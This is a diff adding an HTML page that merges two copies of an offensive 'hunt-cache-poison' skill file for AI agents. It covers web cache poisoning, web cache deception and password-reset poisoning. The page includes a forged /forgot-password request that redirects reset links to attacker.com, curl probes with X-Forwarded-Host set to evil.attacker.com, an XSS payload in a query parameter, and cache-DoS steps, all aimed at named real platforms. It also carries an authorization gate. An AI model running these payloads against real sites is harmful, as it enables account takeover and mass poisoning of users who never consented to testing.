@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>hunt-cache-poison</title>
+<style>
+body { font: 14px/1.45 ui-monospace, monospace; margin: 1.5rem; }
+a { color: #0645ad; }
+table { border-collapse: collapse; width: 100%; }
+th, td { text-align: left; padding: 0.2rem 0.7rem 0.2rem 0; vertical-align: top; }
+th { border-bottom: 1px solid #ccc; }
+.crumbs { margin-bottom: 1rem; }
+.meta { color: #444; }
+pre { white-space: pre-wrap; background: #f6f6f6; padding: 0.8rem; }
+</style>
+</head>
+<body>
+<p class="crumbs"><a href="../../index.html">domains</a> / <a href="../index.html">security</a> / <a href="index.html">cache-poisoning-hunt</a> / hunt-cache-poison</p><h1>hunt-cache-poison</h1><p class="meta">combined</p><p>The two copies share the same core methodology (map cache, identify unkeyed headers, test reflection, WCD, validate storage), but each contains material steps the other lacks. The uphiago copy includes a 10-step methodology with DoS-via-cache, parameter pollution, TTL measurement, and blast-radius documentation, plus a detailed payload/detection section. The sickn33 copy adds a mandatory authorization/confirmation gate and an &#x27;Autonomous Testing Priority&#x27; section that explicitly prioritizes password-reset poisoning (Host header injection) as a distinct first attack, which the uphiago copy does not highlight as a separate priority. Because the sickn33 copy imposes a strict authorization gate and a different attack prioritization, crowning one would hide a real alternative procedure.</p><h2>Repositories</h2><table><thead><tr><th>Repository</th><th>Path</th></tr></thead><tbody><tr><td><a href="https://github.com/uphiago/recon-skills">uphiago/recon-skills</a></td><td><code>redteam/hunt-cache-poison/SKILL.md</code></td></tr><tr><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>plugins/agentic-awesome-skills-claude/skills/hunt-cache-poison/SKILL.md</code></td></tr></tbody></table><h2>Other copies</h2><table><thead><tr><th>Role</th><th>Repository</th><th>Path</th></tr></thead><tbody><tr><td>peer</td><td><a href="https://github.com/uphiago/recon-skills">uphiago/recon-skills</a></td><td><code>redteam/hunt-cache-poison/SKILL.md</code></td></tr><tr><td>peer</td><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>plugins/agentic-awesome-skills-claude/skills/hunt-cache-poison/SKILL.md</code></td></tr><tr><td>adapter</td><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>plugins/agentic-awesome-skills/skills/hunt-cache-poison/SKILL.md</code></td></tr><tr><td>adapter</td><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>skills/hunt-cache-poison/SKILL.md</code></td></tr></tbody></table><h2>Combined skill</h2><pre>---
+name: hunt-cache-poison
+description: Hunting skill for cache poison vulnerabilities, including Web Cache Deception, Host header injection, and CDN cache poisoning.
+category: security
+risk: offensive
+license: MIT
+---
+
+&gt; **⚠️ AUTHORIZED USE ONLY**
+&gt; This skill is for educational purposes or authorized security assessments only.
+&gt; You must have explicit, written permission from the system owner before using this tool.
+&gt; Misuse of this tool is illegal and strictly prohibited.
+
+&gt; **Mandatory confirmation gate**
+&gt; Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
+&gt; 1. Ask the user to state the exact target URL, IP, account, or resource.
+&gt; 2. Ask the user to confirm written authorization and the permitted scope.
+&gt; 3. Show the exact command(s) and explain their expected effect.
+&gt; 4. Wait for explicit confirmation in the current conversation.
+&gt;
+&gt; Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.
+
+## Crown Jewel Targets
+
+Cache poisoning is high-value because a single poisoned cache entry can affect thousands or millions of victims simultaneously — one request, mass exploitation. Payout scales with blast radius.
+
+**Highest-value targets:**
+- **CDN-served assets** (cdn.shopify.com, cloudfront distributions, Fastly/Akamai edges) — poisoning these affects every visitor globally
+- **E-commerce platforms** with affiliate/referral flows (Shopify, WooCommerce storefronts) — session hijack or affiliate fraud potential
+- **Gaming platforms with update servers** (rockstargames updates.* domains) — DoS on update delivery = widespread client breakage
+- **Authentication endpoints** served through caches — leads to account takeover (the highest severity variant)
+- **Asset CDNs** (JS/CSS delivery) — XSS payload delivery at scale
+- **SaaS multi-tenant platforms** — one poisoned response bleeds into all tenants sharing a cache key
+
+**Asset types that pay most:** CDN hostnames, subdomain-per-tenant patterns, update/download servers, login/account pages cached incorrectly, affiliate link shorteners.
+
+## Autonomous Testing Priority
+
+**Two distinct attacks live under this skill — target the simpler one first.**
+
+**Attack 1 — Password Reset Poisoning (Host header injection):**
+
+The app uses the `Host` header to construct the password reset link in the email. Inject an attacker-controlled hostname; the victim&#x27;s reset email contains a link to your server.
+
+```
+POST /forgot-password
+Host: attacker.com
+X-Forwarded-Host: attacker.com
+X-Host: attacker.com
+
+email=victim@target.com
+Content-Type: application/x-www-form-urlencoded
+```
+
+Use a distinctive hostname you control or can identify in the response. **Proof:** the injected hostname appears in the response body (some apps reflect the generated reset link), or the action succeeds (2xx with a &quot;reset email sent&quot; message) after injection — confirming the poisoned link would be sent to the victim.
+
+Try multiple host headers — apps vary in which one they trust (`X-Forwarded-Host` is most common, but `Host` itself also works when the proxy passes it through).
+
+**Attack 2 — Web Cache Poisoning:**
+
+Inject the attacker-controlled hostname into `X-Forwarded-Host` on a GET request for a cacheable page. If the hostname is reflected in the response body AND the response gets cached, subsequent visitors receive the poisoned response.
+
+Check for cache signals in the response: `X-Cache: HIT`, `CF-Cache-Status: HIT`, `Age: &lt;nonzero&gt;`, or `Via: cloudfront/varnish/fastly`.
+
+**Proof for both:** injected value reflected in response body, or action completed successfully despite the manipulated header.
+
+## Attack Surface Signals
+
+**URL patterns to look for:**
+- `cdn.`, `assets.`, `static.`, `updates.`, `downloads.` subdomains
+- URL path structures with extensions that look static: `/path/to/page.css`, `/account.php/nonexistent.jpg`
+- Affiliate/link shortener endpoints: `/link/`, `/go/`, `/ref/`, `/out/`
+- Paths that mix dynamic content with cacheable-looking URLs
+
+**Response headers that signal a cache:**
+```
+X-Cache: HIT / MISS
+X-Cache-Status: HIT
+CF-Cache-Status: HIT / MISS (Cloudflare)
+Age: &lt;nonzero&gt;
+Via: 1.1 varnish / cloudfront / fastly
+Cache-Control: public, max-age=...
+Surrogate-Control: max-age=...
+X-Served-By: cache-...
+```
+
+**JS/tech stack signals:**
+- Fastly, Varnish, Cloudfront, Akamai, Nginx proxy_cache in response headers
+- Shopify/Linkpop stacks with third-party integrations
+- Platforms using path-based routing without normalizing trailing segments
+- Servers that reflect unvalidated headers into responses (Host, X-Forwarded-Host, X-Original-URL)
+
+**Dangerous header candidates (unkeyed inputs):**
+```
+X-Forwarded-Host
+X-Host
+X-Forwarded-Scheme
+X-Original-URL
+X-Rewrite-URL
+Forwarded
+X-HTTP-Method-Override
+```
+
+## Step-by-Step Hunting Methodology
+
+1. **Map cache infrastructure.** Send a GET to the target and inspect response headers. Identify the caching layer (Cloudflare, Fastly, Varnish, Nginx). Note `Age`, `X-Cache`, `CF-Cache-Status` headers.
+
+2. **Identify cache key components.** Send two identical requests — if `Age` increments, the response is cached. Vary headers one-by-one (e.g., add `X-Forwarded-Host`) to determine which headers are NOT included in the cache key (unkeyed).
+
+3. **Test unkeyed header reflection.** Add `X-Forwarded-Host: evil.com` and check if the value appears in the response body (redirects, canonical links, CSP headers, JS src attributes, meta tags). Append a unique cache-busting query parameter (e.g. `?cb=&lt;random&gt;`) so the probe lands on a cache MISS under a throwaway key — this verifies reflection without prematurely storing a live poison entry under the real, victim-shared cache key. (Param Miner&#x27;s &quot;Guess headers&quot; mode is the canonical Burp toolchain for discovering these unkeyed headers/parameters automatically.)
+
+4. **Test URL path manipulation (Web Cache Deception).** Append fake static extensions to dynamic endpoints:
+   - `GET /account/profile.css`
+   - `GET /dashboard/settings.jpg`
+   - `GET /affiliate-link/target.js`
+   Check if the server returns dynamic content AND the cache stores it.
+
+5. **Test for DoS via cache poisoning.** Send a request with a header that causes a 4xx/5xx error and check if that error response gets cached:
+   - Malformed `Host` header
+   - `X-Forwarded-Host` pointing to an invalid host
+   - Oversized headers that trigger backend errors
+
+6. **Confirm unkeyed parameter poisoning.** Try query parameter fatigue or HTTP parameter pollution:
+   - `GET /page?utm_source=&quot;&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;`
+   Check if the param is reflected and cached for clean requests to `/page`.
+
+7. **Validate cache storage.** After sending a potentially poisoned request, immediately request the same URL WITHOUT the malicious header from a different IP or incognito session. If you receive the poisoned response — it&#x27;s confirmed.
+
+8. **Measure cache TTL.** Check `Cache-Control: max-age` and `Age` to understand how long the poison persists and whether it&#x27;s exploitable before expiry.
+
+9. **Check affiliate/link flows specifically.** For platforms like Linkpop, test whether the referrer/product URL is embedded in a cacheable response that another user will receive.
+
+10. **Document blast radius.** Determine: global CDN edge (worldwide), regional cache, or single-server cache. This directly affects severity rating.
+
+## Payload &amp; Detection Patterns
+
+**Confirm caching behavior:**
+```bash
+# Send twice, compare Age header
+curl --max-time 30 --connect-timeout 10 -s -I &quot;https://target.com/page&quot; | grep -i &quot;age\|x-cache\|cf-cache&quot;
+curl --max-time 30 --connect-timeout 10 -s -I &quot;https://target.com/page&quot; | grep -i &quot;age\|x-cache\|cf-cache&quot;
+```
+
+**Test unkeyed X-Forwarded-Host:**
+```bash
+curl --max-time 30 --connect-timeout 10 -s -H &quot;X-Forwarded-Host: evil.attacker.com&quot; \
+  &quot;https://target.com/page&quot; | grep -i &quot;evil.attacker.com&quot;
+```</pre>
+</body>
+</html>
